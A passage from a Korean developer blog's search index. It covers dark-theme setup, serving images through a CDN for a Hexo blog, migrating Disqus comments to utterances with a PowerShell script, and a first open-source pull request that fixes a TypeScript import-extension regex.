tools) 눌러서 Rendering 탭 오픈 스크롤 중간 정도에 Emulate CSS media feature prefer-color-scheme 에서 테마 선택 참고 https://css-tricks.com/a-complete-guide-to-dark-mode-on-the-web/ https://github.com/chinsun9/dark-theme-practice","link":"/2021/05/31/web-dark-theme/"},{"title":"windows dark mode 윈도우 다크 테마","text":"다크 모드는 OS에서 설정할 수 있다 최상위 (OS)에서 설정해두면 그 위에서 돌아가는 앱이 자동으로 테마를 스위치 한다 깃허브 다크 모드가 크롬 프로필에 따라 풀려서 다크 모드로 설정을 하려는데 시스템 기반으로 테마를 토글 하는 기능이 있음을 알게 되었다 그래서 윈도우에서 다크 모드 적용을 알아보았다 윈도우 다크 모드 win 키를 누르고 theme를 검색하면 테마 컬러 선택 설정으로 들어갈 수 있다 색 선택에서 어둡게를 선택하면 다크 모드 설정 완료이다 익스플로러나 브라우저를 보면 자동으로 다크 모드가 된 것을 확인할 수 있다 깃허브 사이트나 깃허브 데스크톱 앱도 자동으로 다크 모드로 전환되었다 앱또는 웹사이트마다 일일이 다크 모드 적용하기보다 OS 레벨에서 다크 모드를 적용하는 것이 훨씬 유용하다","link":"/2021/05/31/windows-dark-mode/"},{"title":"깃허브 블로그 느린 웹 해결하기","text":"2020.01.04 처음 느린 웹 보고서를 확인하고 그냥 방치 했는데… 나날이 늘어가는 느린 URL들… jsdelivr 적용 후, 지금까지! 상황 구글 서치 콘솔에서 블로그에 대한 보고서를 보는데, 느린 웹 문제가 있었다 어떻게 블로그를 빠르게 할 수 있는지 고민해보았다 https://derek-mun.com/contents/Contents-Github-page-image-loading-speed.html 그러다가 이미지에 cdn을 적용하면 속도를 개선할 수 있겠다는 생각을 하였다 내 환경 hexo 프레임워크로 블로그를 운영하고 있다 블로그 글이 점점 많아지고, 글에 많은 이미지를 포함하는 글도 있다 해결 : jsdelivr 적용 jsdelivr는 npm과 github에서 사용할 수 있는 무료 CDN이다 오픈소스 프로젝트를 위한 CDN이라고 한다 jsdelivr는 아무런 설정 없이 누구나(npm, github 사용자) 사용할 수 있는 게 장점이다 jsdelivr 사용법 https://chinsun9.github.io/images/web-dark-theme20210531/preview.png (원본)https://cdn.jsdelivr.net/gh/chinsun9/chinsun9.github.io@master/images/web-dark-theme20210531/preview.png (CDN 적용) https://cdn.jsdelivr.net/gh/`{username}`/`{reponame}`@{`branch`}/`{filepath}` 사용 방법이 엄청나게 간단하다 참고 ; 변환도구 ; https://www.jsdelivr.com/github hexo에서 적용 포스트를 작성할 때 cdn을 적용한 url을 적어줘도 상관은 없지만, 이미 작성된 글들에 대해 수행해야 하는 불편함이 있다 hexo 모듈을 살펴보니 node_modules/hexo/lib/plugins/filter/after_post_render/index.js에서 추가적인 작업을 해줄 수 있다는 것을 알게 되었다 hexo/lib/plugins/filter/after_post_render/index.js1234567891011121314151617181920212223242526272829'use strict';module.exports = (ctx) =&gt; { const { filter } = ctx.extend; function lazyProcess(htmlContent) { let rootUrl = 'https://cdn.jsdelivr.net/gh/chinsun9/chinsun9.github.io@master'; return htmlContent.replace( /&lt;img(.*?)src=&quot;(.*?)&quot;(.*?)&gt;/gi, function (str, p1, p2) { if (/src=&quot;data:image(.*?)/gi.test(str)) { return str; } if (p2.indexOf('http') === 0) { return str; } return str.replace(p2, rootUrl + p2); } ); } filter.register('after_post_render', require('./external_link')); filter.register('after_post_render', require('./excerpt')); filter.register('after_post_render', function (data) { data.content = lazyProcess.call(this, data.content); return data; });}; 코드 참고 ; https://github.com/zhepama/hexo-generator-cdn/blob/master/lib/process.js 생성된 html에서 이미지 태그 문자열을 정규식으로 뽑는다 rootUrl로 선언한 cdn을 위한 이미지 prefix와 기존 filepath를 결합한다 node_modules 아래에 있는 파일을 수정한 것이라, 좋은 접근은 아닌 것 같다 이런 경우에 어떻게 노드 모듈 외부에서 함수를 오버라이딩할 수 있는지… 일단 나는 이렇게 해서 사용하고 있다 경과 2021-03-12 이미지에 cdn 적용했다 10일 후에 점점 느린 URL이 없어지고 있는 것을 확인할 수 있다 지금은 느린 웹이 없다! 주의사항 이미지를 수정해도 즉시 반영되지 않는다 즉시 반영을 원한다면 이름을 바꿔주자 참고 https://derek-mun.com/contents/Contents-Github-page-image-loading-speed.html https://hexo.io/ko/api/filter.html https://github.com/zhepama/hexo-generator-cdn/blob/master/lib/process.js","link":"/2021/05/31/%EA%B9%83%ED%97%88%EB%B8%8C-%EB%B8%94%EB%A1%9C%EA%B7%B8-%EB%8A%90%EB%A6%B0-%EC%9B%B9-%ED%95%B4%EA%B2%B0%ED%95%98%EA%B8%B0/"},{"title":"github 404 page clone","text":"https://chinsun9.github.io/github-404-page-clone/ github 404 페이지를 클론해보았다 마우스 움직임에 따라 원근감 있게 움직이는 이미지들이 재밌었다 전에 3d 카드 이펙트 만들면서 perspective css 속성을 사용해보았는데, 그때 사용한 코드를 거의 그대로 사용해서 만들 수 있었다 3d card effect ; https://github.com/chinsun9/3d-card-effect 이미지는 직접 그렸다. 물론 바닥에 대고… 참고 https://github.com/chinsun9/github-404-page-clone","link":"/2021/06/01/github-404-page-clone/"},{"title":"blog update dark theme","text":"캬캬캬 블로그 dark 테마 적용 상단 오른쪽 검색 버튼 옆에서 토글 할 수 있다!! 다크 테마를 적용한 이유 github 프로필 메인에 dark theme를 토글하는 버튼이 있었는데 어느샌가 세팅 하위 메뉴로 들어가야 변경이 가능했다 세팅에서 테마를 고르는데 시스템 테마를 상속받아 보여주는 옵션이 있었다 궁금해서 공부해보고 블로그에도 적용하게 되었다 처음 C언어를 배울 때 visual studio 사용했다 기본 테마가 화이트였다 기본 테마를 쓰다가 웹 공부를 시작하면서 유튜버들 세팅을 따라 하다가 다크 테마를 쓰게 됐다 써보니까 괜찮고 좋은 것 같다! 환경 나는 icarus default theme를 사용 중이다 적용 방법 기본적으로 body에 dark class 가 있으면 다크 테마에 맞는 css로 오버라이드하는 방식이다 css 추가 dark theme에 맞게 새로 추가할 css는 icarus theme 디렉터리를 기준으로 source/css 아래에 dark.styl이름으로 파일을 하나 생성했다 앞으로 나오는 경로는 모두 icarus theme 디렉터리가 기준이다 source/css/dark.styl1234567891011121314151617body.dark { background-color: #1e1e1e; .navbar { background-color: #3C3C3C; color: #d4d4d4; .navbar-menu { background-color: transparent !important; .navbar-item { color: inherit; &amp;:hover, &amp;:focus { background-color: #37373D; color: #007acc; } 어떤 테마 시스템이 있고 그런 게 아니라서 하나하나 수작업으로 바꿔주었다 body.dark 일 때 css를 오버라이드 할 수 있도록… source/css/style.styl12// ...@import './dark.styl'; dark.styl을 style.styl 마지막에 임포트 해준다 그럼 css는 끝! 토글 버튼 추가 이제 토글 버튼을 추가해보자 나는 navbar 상단 오른쪽 검색 버튼 옆에 추가했다 layout/common/navbar.jsx1234&lt;div class=&quot;navbar-end&quot;&gt; &lt;button type=&quot;button&quot; id=&quot;toggleTheme&quot; class=&quot;navbar-item&quot;&gt; hi &lt;/button&gt; layout/common/navbar.jsx 80라인에 toggleTheme라는 ID로 추가했다 이제 버튼에 기능을 넣어줘야 하는데 navbar.jsx에서 기능도 추가하고 싶었는데, 어떻게 빌드되는지 구조를 잘 몰라서 실패했다 대신 source/js 디렉터리에 theme.js 파일을 하나 추가했다 theme.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253const btn = document.getElementById('toggleTheme');function initTheme() { // chk local storage const theme = localStorage.getItem('theme'); if (theme === 'dark') { document.body.classList.add('dark'); btn.innerText = '🌙'; return; } if (theme === 'light') { btn.innerText = '🌞'; return; } // visit first time const isDark = window.matchMedia('(prefers-color-scheme: dark)'); if (isDark) document.body.classList.add('dark'); localStorage.setItem('theme', isDark ? 'dark' : 'light'); btn.innerText = isDark ? '🌙' : '🌞';}function toggleTheme() { console.log(`toggle theme`); document.body.classList.toggle('dark'); localStorage.setItem( 'theme', document.body.classList.contains('dark') ? 'dark' : 'light' ); btn.innerText = document.body.classList.contains('dark') ? '🌙' : '🌞';}window .matchMedia('(prefers-color-scheme: dark)') .addEventListener('change', (e) =&gt; { const newColorScheme = e.matches ? 'dark' : 'light'; localStorage.setItem('theme', newColorScheme); if (newColorScheme === 'dark') { document.body.classList.add('dark'); btn.innerText = '🌙'; return; } document.body.classList.remove('dark'); btn.innerText = '🌞'; });btn.addEventListener('click', function (event) { toggleTheme();});initTheme(); 셀럭터로 위에서 추가한 버튼을 가져와서 클릭 이벤트 리스너를 달아줬다 이제 hexo로 빌드하면서 생성되는 html에 해당 스크립트를 로드하도록 해야 한다 스크립트 파일 추가 layout/common/scripts.jsx에 위에서 만든 theme.js를 등록하면 된다 layout/common/scripts.jsx12345&lt;Fragment&gt; // ... &lt;script src={url_for('/js/main.js')} defer&gt;&lt;/script&gt; &lt;script src={url_for('/js/theme.js')} defer&gt;&lt;/script&gt;&lt;/Fragment&gt; 56라인 정도 되는 부분에 &lt;script src={url_for('/js/theme.js')} defer&gt;&lt;/script&gt; 추가한다 마지막으로 hexo 디렉터리로 돌아와서 public/css 하위에 있는 css를 삭제해준다 이제 hexo generate 하게 되면 css가 갱신되고, 테마 토글 버튼이 달려 있는 html이 생성될 것이다 후기 뿌듯하다 다 완성하고 자려고 누워서 폰으로 내 블로그를 들어가 봤는데 눈이 편안했다","link":"/2021/06/01/blog-update-dark-theme/"},{"title":"slash converter","text":"https://chinsun9.github.io/slash-converter/ 파일 경로 문자열 변환기를 만들었다 파일 경로를 적어야 할 때가 생각보다 많은데 어떤 때는 /를 사용하고 어떤 때는 \\를 사용하고 또 어떤 때는 \\\\를 사용한다 일일이 수정해주기 귀찮을 때가 분명히 있었을 것이다 변환 코드Main.tsx123const convertSlash = (type: string, origin: string) =&gt; { return origin.replace(/[/\\\\]+/g, type);}; 슬래시와 백슬래시를 찾아내서 정해진 타입으로 변환한다 그 외 emotion theme provider를 사용해 테마를 적용해보았다 참고 https://github.com/chinsun9/slash-converter","link":"/2021/06/02/slash-converter/"},{"title":"202105 검색 실적","text":"","link":"/2021/06/08/202105-%EA%B2%80%EC%83%89-%EC%8B%A4%EC%A0%81/"},{"title":"blog update utterances","text":"댓글 시스템을 disqus에서 utterances로 수정했다","link":"/2021/06/08/blog-update-utterances/"},{"title":"블로그 댓글 시스템 disqus에서 utterances로 바꾸기","text":"disqus에 달린 댓글을 utterances가 읽을 수 있게 이슈 생성하기 자문자답하는 것처럼 하나의 계정으로 달리지만 댓글이 없어지지 않는 게 의미가 크다..! 이런 형식이 utterances가 사용하는 포맷이다 이 포맷과 동일하게 수동으로 이슈를 등록하는 것도 좋은? 방법이다 하는 법환경 windows 10 나는 hexo, icarus theme를 사용하고 있다 hexo version ; 5.0.0 hexo-theme-icarus version ; 4.0.1 disqus 기존 댓글 가져오기 블로그에 댓글 몇 개 없지만 없는 만큼 너무 소중해서 같이 옮긴다 https://lazywinadmin.com/2019/04/moving_blog_comments.html 위 글을 따라가면서 블로그 댓글 시스템 disqus에서 utterances로 바꿔보자 위 글에서는 파워셸을 통해서 export 한 xml을 조작해서 utterances에서 사용하는 이슈로 등록해준다 disqus에 로그인한 상태로 https://chinsung.disqus.com/admin/discussions/export/ 위 링크로 접속해서 버튼을 누르면 된다 버튼을 누르면 내 요청이 큐가 되었다고 하면서 결과를 이메일로 보내준다고 한다 나 같은 경우 바로 이메일이 왔다 링크를 눌러 다운로드하자 압축을 풀면 xml 파일이 나온다 앞으로의 내용은 이 xml 파일을 읽어서 작업한다 disqus 댓글 정제하기 참고로 나는 파워셸 커맨드를 잘 모른다 그대로 따라 하다가 내가 겪었던 문제들이 몇 가지 있었다 원본 글에서는 커맨드에 대해 블록을 나눠서 잘 설명해준다 나는 설명보다는 내가 어떤 문제를 만나서 코드를 어떻게 수정했고 성공한 코드를 마지막에 통짜로 첨부하겠다 파워셸을 관리자 권한으로 실행한다 편한 작업을 위해 cd 명령으로 xml이 있는 위치로 이동한다 나는 파워셸 스크립트(foo.ps1)를 만들어서 실행하는 방법으로 했다 실행은 .\\myPsScript.ps1 이렇게 앞에 .\\을 붙여 실행할 수 있다 파워셸 시크립트 실행 활성화 파워셸 스크립트를 실행하려면 실행 정책을 변경해야 한다 12Set-ExecutionPolicy AllSignedSet-ExecutionPolicy RemoteSigned 변경하시겠습니까? 물어보면 Y로 답하면 된다 인코딩 문제 파일을 읽는 것부터 실패했다 new1.ps1123456789# Load the file# $Disqus = Get-Content -Path .\\origin.xml$Disqus = Get-Content -Path .\\origin.xml -encoding UTF8 # 여기 -encoding UTF8 추가# Cast the file to XML format$DisqusXML = ([xml]$Disqus).disqus# Output result$DisqusXML -encoding UTF8을 추가해준다 필터링 문제12345678910$AllThreads = $AllThreads | Where-Object -FilterScript { $_.link -match &quot; \\.io\\/\\d{4}\\/.+html$| \\.com\\/\\d{4}\\/.+html$| \\.com\\/p\\/.+html$| \\.io\\/minimal-mistakes\\/\\d{4}\\/.+html$| \\.io\\/powershell\\/\\d{4}\\/.+html$| \\.io\\/usergroup\\/\\d{4}\\/.+html$&quot; -and $_.link -notmatch &quot;googleusercontent\\.com&quot;} 문제까지는 아니고, 글을 잘 안 읽고 그냥 코드를 복붙하다 보니까 글쓴이에 상황에 맞춰진 조건을 그대로 사용해 생긴 문제였다 저 코드를 내 상황에서 돌리면 모든 쓰레드가 조건에 충족하지 않아 결과가 빈 배열이다 나는 필터링이 필요하지 않았다 그래서 이 과정은 생략했다 개인 설정 문제123456# Define Github commands default params$GithubSplat = @{ OwnerName = 'lazywinadmin' RepositoryName = 'lazywinadmin.github.io'}$BlogUrl = 'https://lazywinadmin.com' 코드 좀 보고 복붙하자… 남의 레포를 업데이트할 권한이 없어서 망정이지… 123456# Define Github commands default params$GithubSplat = @{ OwnerName = 'chinsun9' RepositoryName = 'chinsun9.github.io'}$BlogUrl = 'https://chinsun9.github.io/' # 주의! 마지막 슬래시 넣기! 내 환경에 맞게 적절히 수정해준다 github personal access token 발급 받기 파워셸에서 github api를 통해 이슈를 자동 생성한다 github api를 사용하기 위해서는 토큰이 필요하다 github에 로그인한 상태로 https://github.com/settings/tokens 에 접속해서 Generate new token 버튼을 누른다 note를 적당히 작성하고 repo 전체 권한을 가지도록 생성한다 생성된 키를 복사한다 완성 코드 내가 사용한 코드이다 실행할 때는 관리자 권한으로 파워셸을 실행시켜야 한다 가장 상위에 개인이 설정해야 하는 변수들을 몰아놨다 해당 변수들은 전부 자신에 맞게 수정한 다음 실행해보아야 한다 특히 RepositoryName은 일회용으로 사용할 레포를 생성하고 한번 테스트해보는 것을 추천한다 혹시나 잘못된 이슈가 엄청나게 생성될 수 있기 때문이다 일회용 레포를 하나 만들고 테스트해보고 진짜 레포에 적용하는 게 좋을 것 같다 파워셸에서 github api를 사용하기 위한 powershellforgithub 모듈을 다운로드하는 코드가 4번째 라인에 있다 코드를 실행하면 뭐라 뭐라 설치할 건지 물어보는데 모두 Y로 답하면 된다 utterances는 공개 레포에서 작동하니까 별도 레포를 만들지 않고, 블로그의 본체인 chinsun9.github.io 레포를 그냥 사용했다 complete code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322# 출처 ; https://lazywinadmin.com/2019/04/moving_blog_comments.html# First fetch the module from the PowerShell GalleryInstall-Module -Name powershellforgithub -scope currentuser -verbose# Import itImport-Module -Name powershellforgithub### 개인 설정 시작 ###$filePath = '.\\origin.xml' # disqus export xml filepath# Define Github commands default params$GithubSplat = @{ OwnerName = 'chinsun9' # github username RepositoryName = 'chinsun9.github.io' # reponame ; 처음 테스트할 땐 일회용 레포하나 만들고 결과가 어떻게 나오나 확인해자}$BlogUrl = 'https://chinsun9.github.io/' # blog url ; 마지막 슬래시 있어야함!# Specify our Github Token$key = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' # 깃허브에서 발급한 personal access token!!$IssueLabel = 'blog comments' # 라벨 설정### 개인 설정 끝 #### Load the file$Disqus = Get-Content -Path $filePath -encoding UTF8# Cast the file to XML format$DisqusXML = ([xml]$Disqus).disqus# 코멘트 작업# Retrieve all Comments$AllComments = $DisqusXML.post# Retrieve properties available for each comments$Properties = $AllComments | Get-Member -MemberType Property# Process each Comments$AllComments = $AllComments | Foreach-Object -process { # Store the current comment $Comment = $_ # Create Hashtable to store properties of the current comment $Post = @{} # Go through each properties of each comments foreach ($prop in $Properties.name) { if ($prop -eq 'id') { # Capture Unique IDs $Post.DsqID = $Comment.id[0] $Post.ID = $Comment.id[1] } elseif ($prop -eq 'author') { # Author information $Post.AuthorName = $Comment.author.name $Post.AuthorIsAnonymous = $Comment.author.isanonymous } elseif ($prop -eq 'thread') { # Here is the important data about the # thread the comment belong to $Post.ThreadId = $Comment.thread.id } elseif ($prop -eq 'message') { $Post.Message = $Comment.message.'#cdata-section' } else { # Other properties $Post.$prop = ($Comment | Select-Object -ExpandProperty $prop ) -replace '`r`n' } # Keep the original comment data structure if we need it later $Post.raw = $Comment } # Return a PowerShell object for the current comment New-Object -TypeName PSObject -Property $Post}# 쓰레드 작업# Retrieve threads$AllThreads = $DisqusXML.thread# Retrieve Thread properties$Properties = $AllThreads | Get-Member -MemberType Property# Process each threads$AllThreads = $AllThreads | Foreach-Object -process { # Capture Current ThreadItem $ThreadItem = $_ # Create Hashtable for our final object $ThreadObj = @{} # Go through each properties of each threads foreach ($prop in $Properties.name) { if ($prop -eq 'id') { # Thread ID $ThreadObj.ID = $ThreadItem.id[0] } elseif ($prop -eq 'author') { # Author $ThreadObj.AuthorName = $ThreadItem.author.name $ThreadObj.AuthorIsAnonymous = $ThreadItem.author.isanonymous $ThreadObj.AuthorUsername = $ThreadItem.author.username } elseif ($prop -eq 'message') { $ThreadObj.Message = $ThreadItem.message.'#cdata-section' } elseif ($prop -eq 'category') { $ThreadObj.Category = ($ThreadItem | Select-Object -ExpandProperty $prop).id } else { # Other properties $ThreadObj.$prop = ($ThreadItem | Select-Object -ExpandProperty $prop) -replace '`r`n' } $ThreadObj.raw = $ThreadItem } # Return a PowerShell object for the current ThreadItem New-Object -TypeName PSObject -Property $ThreadObj}$AllThreads = $AllThreads |Select-Object -Property *,@{L = 'link2'; E = { $_.link -replace &quot;$($BlogUrl)&quot; }},@{L = 'title2'; E = { $_.title }} |Group-Object -Property link2$ThreadsUpdated = $AllThreads |Sort-Object -Property count |ForEach-Object -Process { # Capture current post $CurrentPost = $_ # if one comment is found if ($CurrentPost.count -eq 1) { if ($CurrentPost.group.title2 -notmatch '^http') { # Add REALTitle property $RealTitle = $CurrentPost.group.title2 # output object $CurrentPost.group | Select-Object -Property *, @{L = 'RealTitle'; e = { $RealTitle } }, @{L = 'ThreadCount'; e = { $CurrentPost.count } } } elseif ($CurrentPost.group.title2 -match '^http') { # lookup online $result = Invoke-webrequest -Uri $CurrentPost.group.link -Method Get # add REALTitle prop $RealTitle = $result.ParsedHtml.title # output object $CurrentPost.group | Select-Object -Property *, @{L = 'RealTitle'; e = { $RealTitle } }, @{L = 'ThreadCount'; e = { $CurrentPost.count } } } } if ($CurrentPost.count -gt 1) { if ($CurrentPost.group.title2 -notmatch '^http') { # add REALTitle prop $RealTitle = ($CurrentPost.group.title2 | Where-Object -FilterScript { $_ -notmatch '^http' } | Select-Object -first 1) # Output object $CurrentPost.group | Select-Object -Property *, @{L = 'RealTitle'; e = { $RealTitle } }, @{L = 'ThreadCount'; e = { $CurrentPost.count } } } elseif ($CurrentPost.group.title2 -match '^http') { # get url of one $u = ($CurrentPost.group | Where-Object { $_.title2 -match '^http' } | Select-Object -first 1).link # lookup online $result = Invoke-webrequest -Uri $u -Method Get # add REALTitle prop $RealTitle = $result.ParsedHtml.title # output object $CurrentPost.group | Select-Object *, @{L = 'RealTitle'; e = { $RealTitle } } } else { # add REALTitle prop $RealTitle = 'unknown' # output object $CurrentPost.group | Select-Object *, @{L = 'RealTitle'; e = { $RealTitle } } } }}$AllTogether = $AllComments | ForEach-Object -Process { $CommentItem = $_ $ThreadInformation = $ThreadsUpdated | Where-Object -FilterScript { $_.id -match $CommentItem.ThreadId } $CommentItem | Select-Object -Property *, @{L = 'ThreadTitle'; E = { $ThreadInformation.Realtitle } }, @{L = 'ThreadLink'; E = { $ThreadInformation.link2 } }} |Group-Object -Property ThreadLink |Where-Object -FilterScript { $_.name }# 이슈달기 작업$KeySec = ConvertTo-SecureString $key -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential ('username_is_ignored', $KeySec)#$cred = Get-Credential -UserName $null# Set Connection and configurationSet-GitHubAuthentication -Credential $credSet-GitHubConfiguration -DisableLogging -DisableTelemetry# Retrieve issues#$issues = Get-GitHubIssue -Uri 'https://github.com/lazywinadmin/lazywinadmin.github.io'$issues = Get-GitHubIssue @githubsplat# Process each threads with their comments$AllTogether |Sort-Object name -Descending |ForEach-Object -Process { # Capture current thread $BlogPost = $_ # Issue Title, replace the first / and # remove the html at the end of the name $IssueTitle = $BlogPost.group.ThreadLink | select-object -first 1 # lookup for existing issue $IssueObject = $issues | Where-Object -filterscript { $_.title -eq $IssueTitle } if (-not $IssueObject) { # Build Header of the post $IssueHeader = $BlogPost.group.ThreadTitle | select-object -first 1 # Define blog post link $BlogPostLink = &quot;$($BlogUrl)$($BlogPost.name)&quot; # Define body of the issue $Body = @&quot;# $IssueHeader[$BlogPostLink]($BlogPostLink)&lt;!--Imported via PowerShell on $(Get-Date -Format o)--&gt;&quot;@ # Create an issue $IssueObject = New-GitHubIssue @githubsplat ` -Title $IssueTitle ` -Body $body ` -Label $IssueLabel } # Sort comment by createdAt $BlogPost.group | Where-Object { $_.isspam -like '*false*' } | Sort-Object createdAt | ForEach-Object { # Current comment $CurrenComment = $_ # Author update # we replace my post author name :) $AuthorName = $($CurrenComment.AuthorName) switch ($AuthorName) { 'Xavier C' { $AuthorName = 'Francois-Xavier Cat' } default {} } # Define body of the comment $CommentBody = @&quot;## **Author**: $AuthorName**Posted on**: ``$($CurrenComment.createdAt)``$($CurrenComment.message)&lt;!--Imported via PowerShell on $(Get-Date -Format o)Json_original_message:$($CurrenComment|Select-Object -ExcludeProperty raw|convertTo-Json)--&gt;&quot;@ # Create Comment New-GitHubComment @githubsplat ` -Issue $IssueObject.number ` -Body $CommentBody } # Close issue Update-GitHubIssue @githubsplat ` -Issue $IssueObject.number ` -State Closed} utterances 설정하기 너무 간단하다 https://github.com/apps/utterances 위 링크로 가서 install 버튼을 누른다 난 특정 레포에만 설치했다 여기 설정은 언제든지 수정 가능하다 놀랍게도 끝났다 내가 사용하는 icarus 테마는 댓글로 discus, utterances 등 여러 타입의 플러그인을 지원해서 config에 추가하면 적용 완료다 blog config 설정하기_config.icarus.yml1234567comment: type: utterances repo: chinsun9/chinsun9.github.io issue_term: pathname label: blog comments theme: github-light crossorigin: anonymous 위처럼 설정한다 레포는 이슈가 등록된 퍼블릭 레포여야 한다 내가 사용한 방법을 그대로 따라왔다면 issue_term은 pathname을 사용해야 한다 label도 등록된 이슈와 동일하게 설정한다 utterances css 수정하기 ; width 100%default.styl123.utterances { max-width: none;} 각자 테마 디렉터리로 가서 css 파일에 가서 추가한다 주의사항테마 설정 시 hexo icarus config에서 utterances 테마를 설정할 때 preferred-color-scheme는 지원하지 않는 것 같다… 이 값이 올 수 없다며 스키마 오류가 난다 (버전 문제일 수 있음) github-dark, github-light은 가능하다 이슈 제목 utterances에서 이슈와 포스트를 맵핑할 때 여러 옵션이 있다 맘에 드는 걸로 골르면 된다 (이 글을 그대로 따라왔다면 pathname으로 해야 함!) 블로그 포스트를 작성하고 수정될 가능성이 있는 값으로 지정하지 않은 게 좋다 나는 첫 번째 옵션인 Issue title contains page pathname으로 매핑하기로 했다 참고로 내 블로그 pathname은 /YYYY/MM/DD/post-title 로 구성되어 유니크한 이름을 가질 수 있다 포스트의 pathname에 한글이 들어가면 이상한 인코딩 된 이슈 제목을 가진다 앞으로 pathname에 한글이 들어가지 않도록 글을 써야겠다… 이렇게 되기 싫으면… 바꾼 이유 disqus를 사용하면 링크가 넣을 수 없다? 댓글에 포함되어 있는 링크가 disqus를 통해 리디렉트되도록 https://disq.us/url?url=https%3A%2F%2Fchinsun9.github.io%2F2020%2F11%2F18%2Freact-typescirpt... 이렇게 감싸 진다 근데 문제는 이렇게 감싸진 링크를 클릭하면 연결이 안 된다 내가 무슨 설정을 잘못한 건지 모르겠지만… 또, 나는 disqus를 블로그를 하기 전까지 모르고 있었다 댓글을 달기 위해서 disqus를 가입해야 하는 벽?이 있지 않을까 생각하게 되었다 참고 https://lazywinadmin.com/2019/04/moving_blog_comments.html https://ppoffice.github.io/hexo-theme-icarus/Plugins/Comment/icarus-user-guide-comment-plugins/#utterances","link":"/2021/06/08/blog-comment-migration-from-disqus-to-utterances/"},{"title":"First Contribution","text":"캬캬캬컄 첫 번째? 기여 npm으로 다운받아지는 모듈에 내가… tsc 문제 타입스크립트로 프론트 프레임워크 없이 바닐라? 웹 프로젝트를 했다 vscode live server로 개발하고 있었다 import/export 구문을 사용하고 싶어서 tsconfig에서 module옵션을 commonjs가 아닌 es2020으로 사용했다 그런데 한 가지 문제가 있었다 아래 tsc의 결과로 트랜스파일 된 js들이 있다 main.ts1import tmp from './tmp'; main.js123import tmp from './tmp'; // tsc 결과import tmp from './tmp.js'; // 내 기대값 tsc 이후에 확장자가 달리지 않는 문제?가 있었다 이러면 live server는 localhost:5500/js/tmp를 못 찾는다 localhost:5500/js/tmp.js 확장자까지 모두 있어야 파일을 찾아 로드할 수 있었다 이거에 대해 구글링을 해보니까 .ts 파일에서 작업할 때 .js 확장자를 붙이는 방법이 있었다 1234567// src-ts/tmp.tsconst tmp = 'chinsung';export default tmp;// src-ts/main.tsimport tmp from './tmp.js';console.log(tmp); 근데 이건 에디터에서는 잘 알아듣게 할 수 있지만 코드를 봐서도 아름답지 못한 느낌이 팍 들었다 다른 방법으로는 서버에서 파일을 찾을 때 확장자가 생략이 되어도 그에 맞는 파일을 서빙하도록 설정하는 방법이 있었다 먼저 live server에서 라우터나 서빙 관련 뭔가 설정 가능한 게 있는지 살펴봤는데 없었다 express 서버를 만들고 해당 기능을 추가하기에는 auto refresh 기능을 포기하고 싶지 않았다 tsc-es2020-fix 발견 이리저리 찾아보다가 https://github.com/microsoft/TypeScript/issues/13422#issuecomment-838857980 이 코멘트를 발견하고 tsc-es2020-fix 모듈을 받아 사용했다 이 모듈은 tsc이후에 생성된 js 파일들을 읽어서 import / export 구문에 확장자를 달아준다 tsc-es2020-fix 문제 발견 잘 쓰고 있다가 한 가지 문제점을 발견했다 main.ts123import tmp from './tmp';// -&gt;import tmp from './tmp.js'; 같은 레벨의 파일 참조는 잘 변환이 되는데 main.ts123import tmp from '../tmp';// -&gt;import tmp from '../tmp'; // 확장자가 붙지 않는다..! 상위 디렉터리를 거치는 경우에 기대한 대로 동작하지 않았다 node_modules에서 tsc-es2020-fix를 이리저리 둘러보다가 변환이 이뤄지는 로직을 찾았다 fix.js12345contents.replace( /(\\sfrom |\\simport\\()([&quot;'])(\\.\\/[^&quot;']+)([&quot;'])/g, (matched, control, q1, from, q2) =&gt; `${control}${q1}${resolveDependency(filename, from, filenames)}${q2}`); 정규식으로 import / export 구문을 찾고 확장자를 붙여주는 것이었다 나는 여기서 정규식을 수정하면 될 것 같았다 간단하게 위 경우도 찾을 수 있게 수정했다 fix.js12345contents.replace( /(\\sfrom |\\simport\\()([&quot;'])(\\.{0,2}\\/{0,1}[^&quot;']+)([&quot;'])/g, (matched, control, q1, from, q2) =&gt; `${control}${q1}${resolveDependency(filename, from, filenames)}${q2}`); 그러자 내가 기대하는 대로 동작하기 시작했다 이때 너무 기분이 좋아서 원본 레포에 가서 fork하고 자신감 넘치게 PR를 했다 첫 기여 PR을 보내고 얼마 지나지 않아 답변이 왔다 테스트를 추가해 달라였는데, 나는 엄청 당황했다 ㅋㅋㅋ 테스트 케이스인 파일을 추가하고 jest -u를 돌려달라는데 jest부터 몰라서 jest 공부도 하고.. 프로젝트 구조도 잘 모르는데, 어찌어찌 내가 생각하는 대로 파일 추가하고 테스트 한 다음에 내 PR을 적용하기 전과 후 결과를 스샷 찍어서 답글을 달았다 괜찮아 보인다며 내 PR이 병합됐다!! 내 변경사항으로 모듈이 업데이트되고, 뭔가 기분이 좋았다 후기 처음 모르는 레포에 가서 PR을 했다 PR하고 피드백받고, 테스트 코드 추가하면서 엄청 떨렸다 그러면서 기여를 어떻게 해야하는지 찾아보고 https://github.com/sindresorhus/.github/blob/main/contributing.md 엄청난 오픈소스 개발자 깃허브도 찾고,, 기여를 어떻게 해야 하는지에 대한 문서에 fork 한 다음에 master 브랜치 작업하고 PR를 보내지 마라라는 항목이 있어서 부끄러워졌다.. 참고 https://github.com/antongolub/tsc-es2020-fix/pull/9","link":"/2021/06/08/first-contribution/"},{"title":"blog update 404","text":"https://chinsun9.github.io/404 기존에는 iframe으로 배너메이커를 보여줬다 hexo 프론트 메터를 layout: false로 설정해 내가 원하는 대로 커스텀할 수 있었다 당시에는 404 페이지에 넣을 내용도 없고 당시 만들었던 배너메이커를 자랑하고자 했다 근데 블로그와 404페이지는 아무 관계가 없는 것처럼 느껴졌다 그래서 이번엔 layout: true 레이아웃을 하면서 간단한 css 이펙트를 넣어보자 생각했다 typewriter animation Kevin Powell 의 https://youtu.be/w1nhwUGsG6M 영상을 보고 따라 했다 hexo front-matter 내 환경은 